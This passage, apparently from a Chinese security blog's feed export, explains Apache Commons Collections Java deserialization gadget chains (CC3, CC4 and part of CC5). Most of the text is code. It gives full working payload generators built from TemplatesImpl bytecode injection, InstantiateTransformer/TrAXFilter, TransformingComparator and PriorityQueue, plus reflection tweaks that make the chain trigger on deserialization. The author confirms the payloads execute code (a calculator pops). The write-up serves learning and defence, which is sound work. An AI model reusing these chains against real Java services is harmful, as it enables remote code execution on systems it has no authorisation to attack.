<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据如上解释，中间部分换为如下代码，就可以执行恶意代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734763748893-88c97446-75ab-436d-94c7-227a4d1e0d62.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734763748893-88c97446-75ab-436d-94c7-227a4d1e0d62.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="Y9Hlp">调用transform方法</h3>
由于cc1的老毛病，我们还是使用`ChainedTransformer`去调用其transform

<p>如下代码相当于调用了<code>instantiateTransformer.transform(TrAXFilter.class)</code></p>
<p>剩下的和之前的是一样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最终代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//可有可无</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class,     mapProxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734764093355-739d98ca-3de5-4fc0-ad78-49f99ce49d91.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734764093355-739d98ca-3de5-4fc0-ad78-49f99ce49d91.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC4链</title>
    <url>/2025/02/27/CC4%E9%93%BE/</url>
    <content><![CDATA[<h1 id="Axna2">CC4链</h1>
之前讲的几条链子，都是在commons-collections3.2.1版本之前的攻击链，cc4是在commons-collections4.0版本中的一条链子

<p>实际上，这条链子还是换汤不换药，只是中间执行的方式换了一下，后面还是命令执行和代码执行两种方式</p>
<h2 id="nAbc8">CC4攻击链分析</h2>
<h3 id="dfZTG">调用transform方法</h3>

<p>这里用到的是<code>TransformingComparator</code>的<code>compare</code>方法，他的属性是public属性，且这个类继承了<strong>Serializable接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="OCbWk">调用compare</h3>

<p>现在只需要找到一个类的readObject方法中调用了compare，实际上在<code>PriorityQueue</code>的<code>readObject</code>方法中调用到了，因为它也是在其他函数中层层调用的，我们这里就直接正向寻找了</p>
<p>以下是函数的调用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        ......</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="tzKwQ">小芝士：</h4>
有同学可能问了，为什么这条链必须是在common collections4.0的情况下呢，我们看一下区别

<p>因为在3.2.1的版本内是不没有继承序列化接口的，而4.0中继承了序列化接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//common collections3.2.1</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//common collections4.0</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable </span><br></pre></td></tr></table></figure>

<p>现在来写一下这个链子，和之前的链子也是大同小异</p>
<p>我们现在只需要把chainedTransformer放入<code>TransformingComparator</code>，再将<code>TransformingComparator</code>放入<code>priorityQueue</code>优先队列里面（这两个类的构造函数如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="line"><span class="params">                                  <span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">        <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">        <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实现如下，这样的话链子的逻辑也就走完了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="RlZd7">后续调整</h2>
<h3 id="VMeEP">自己思考与尝试</h3>
但是运行后却无视发生，应该是在链子运行时有一些条件导致链子没有完整的走下来，我们可以通过动态调试来找到问题出处

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794089444-92a1ac26-438b-4c35-8741-ad4ff460665f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794089444-92a1ac26-438b-4c35-8741-ad4ff460665f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后在这里发现，由于size的原因，并没有走到<code>siftDown</code>方法内，由于size无符号右移以后，为零，所以并没有进行遍历操作，因此我想我们可以通过反射修改size的值为2就可以进行遍历操作</p>
<blockquote>
<p><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">&gt;&gt;&gt; : 无符号右移，忽略符号位，空位都以0补齐</font></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反射修改如下，修改后成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">PriorityQueue</span>&gt; aClass = priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794482096-4a86661d-c386-45fd-8975-9e7a8fede2a5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794482096-4a86661d-c386-45fd-8975-9e7a8fede2a5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794516690-2b97352d-4456-4fd2-93d1-71fee6ac7cde.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794516690-2b97352d-4456-4fd2-93d1-71fee6ac7cde.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="p1qOE">实际</h3>
在这个地方，白日梦组长是向其中add了两个东西，使他的size变为2，但是在这里add方法也会触发compare方法，就是我们说的cc1的老毛病，也是可以构造时传入无用的东西，等add完成后反射修改回去

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> offer(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftUpUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUpComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = e;</span><br><span class="line">        k = parent;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将反射改为add方法后，也可以成功弹出计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740629922114-eb8aca3d-7b1e-4604-a10d-63c1e51d7fc3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740629922114-eb8aca3d-7b1e-4604-a10d-63c1e51d7fc3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC5链</title>
    <url>/2025/03/01/CC5%E9%93%BE/</url>
    <content><![CDATA[<h1 id="dXpnp">CC5</h1>

<p>cc5的后半部分和之前是一样的，只是在调用LazyMap的get方法时，使用的是<code>TiedMapEntry</code>的<code>toString</code>方法，相当于是提供了一个新的入口</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734800821929-8a9e0e29-f2d6-495d-96d6-ce63b4c8122d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734800821929-8a9e0e29-f2d6-495d-96d6-ce63b4c8122d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="N47sb">CC5攻击链分析</h2>
<h3 id="FpvFg">调用get</h3>

<p>这里<code>TiedMapEntry</code>的同<code>toString</code>方法调用了<code>getValue</code>方法，而<code>getValue</code>方法调用了map的<code>get</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TiedMapEntry toString</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>只需要将lazyMap放入<code>TiedMapEntry</code>中，然后调用其<code>toString</code>方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h3 id="FID1K">调用toString</h3>

<p>在<code>&lt;font style=&quot;color:rgb(50, 50, 50);&quot;&gt;BadAttributeValueExpException&lt;/font&gt;</code>的<code>readObject</code>方法中，会调用传入类的toString方法，这里非常简单，也是只需要将<code>TiedMapEntry</code>传入<code>&lt;font style=&quot;color:rgb(50, 50, 50);&quot;&gt;BadAttributeValueExpException&lt;/font&gt;</code><font style="color:rgb(50, 50, 50);">中即可</font></p>
